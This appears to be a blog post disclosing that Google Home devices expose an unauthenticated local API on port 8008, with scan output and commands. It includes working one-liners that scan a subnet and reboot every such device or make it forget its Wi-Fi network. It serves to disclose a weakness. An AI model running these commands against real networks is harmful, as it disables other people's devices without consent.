readability=&quot;-24&quot;&gt;&lt;div class=&quot;player-with-placeholder&quot; readability=&quot;7&quot;&gt;

<title>Google Home (in)Security</title>

<description>&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;TL;DR: An undocumented API in Google home devices is easily exploitable.  

This command will reboot any on your local network:
nmap --open -p 8008 192.168.1.0/24 | awk '/is up/ {print up}; {gsub (/\(|\)/,&quot;&quot;); up = $NF}' | xargs -I % curl -Lv -H Content-Type:application/json --data-raw '{&quot;params&quot;:&quot;now&quot;}' http://%:8008/setup/reboot&lt;/code&gt;
&lt;/pre&gt;
&lt;h3&gt;Introduction&lt;/h3&gt;
&lt;p&gt;I have always been a fan of Google Products, so when they announced the &lt;a href=&quot;https://store.google.com/us/product/google_home_hub?hl=en-US&quot;&gt;Google Home Hub&lt;/a&gt;,¬†I ordered one.&lt;/p&gt;&lt;p&gt;Once I got the Hub on my network I scanned it and it returned the following:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
Nmap scan report for hub&lt;br/&gt;Host is up (0.046s latency).&lt;br/&gt;Not shown: 995 closed ports&lt;br/&gt;PORT STATE SERVICE&lt;br/&gt;8008/tcp open http&lt;br/&gt;8009/tcp open ajp13&lt;br/&gt;8443/tcp open https-alt&lt;br/&gt;9000/tcp open cslistener&lt;br/&gt;10001/tcp open scp-config&lt;br/&gt;&lt;/pre&gt;
&lt;p&gt;I was surprised to see so many ports open so I started to do some research and found that these devicies have an¬†&lt;a href=&quot;https://wiert.me/2017/02/01/some-chromecast-urls/&quot;&gt;undocumented (and amazingly unsecured) API&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;After spending 15 or 20 minutes looking I found that you can reboot the hub with this unauthenticated curl command:¬†¬†&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;curl -Lv -H Content-Type:application/json --data-raw '{&quot;params&quot;:&quot;now&quot;}' http://hub:8008/setup/reboot&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;I tweeted what happens when you run that command:&lt;/p&gt;

&lt;p&gt;After I was able to get the Hub to reboot I was hooked and gave up a few hours of sleep to do some research and ended up finding a bunch of ‚Äúgood‚Äù information (see reading list at bottom).¬†&lt;/p&gt;&lt;p&gt;At the end of the night, I was extremely disappointed¬†with the security of these devices especially coming from Google who I trust with so much of my data and is the driving force behind &lt;a href=&quot;https://cloud.google.com/beyondcorp/&quot;&gt;BeyondCorp&lt;/a&gt;.¬†&lt;br/&gt;&lt;/p&gt;
&lt;h3&gt;Technical Deep Dive&lt;/h3&gt;
&lt;p&gt;I am going to dive directly into sharing some of the commands I have found and the¬†output and will end by showing how a bad actor could use this API.¬†&lt;/p&gt;

&lt;p&gt;This command basically makes the device unusable until you manually reconfigure it using the Google Home application:&lt;/p&gt;

&lt;/pre&gt;
&lt;h3&gt;Malicious Scripting¬†&lt;/h3&gt;
&lt;p&gt;Since none of these endpoints require authentication being malicious¬†on a network with these present is trivial.¬†¬†&lt;/p&gt;
&lt;p&gt;This code will reboot all Google Home devices on the network:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;nmap --open -p 8008 192.168.1.0/24 | awk '/is up/ {print up}; {gsub (/\(|\)/,&quot;&quot;); up = $NF}' | xargs -I % curl -Lv -H Content-Type:application/json --data-raw '{&quot;params&quot;:&quot;now&quot;}' http://%:8008/setup/reboot&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;This code will delete the wireless network from every Google Home on the network causing a manual reconfgiruation.¬†&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;nmap --open -p 8008 192.168.1.0/24 | awk '/is up/ {print up}; {gsub (/(|)/,&quot;&quot;); up = $NF}' | xargs -I % curl -Lv -H Content-Type:application/json --data-raw '{ &quot;wpa_id&quot;: 0 }' http://%:8008/setup/forget_wifi&lt;/code&gt;
&lt;/pre&gt;
&lt;h3&gt;Closing Thoughts&lt;/h3&gt;
&lt;p&gt;I am genuinely shocked by how poor the overall security of these devices are, even more so when you see that these endpoints have been known for years and relatively well documented.¬†&lt;/p&gt;&lt;p&gt;I usually would have worked directly with Google to report these issues if they had not previously disclosed, but due to the sheer amount of prior work online and committed code in their own codebase, it is obvious they know.&lt;/p&gt;
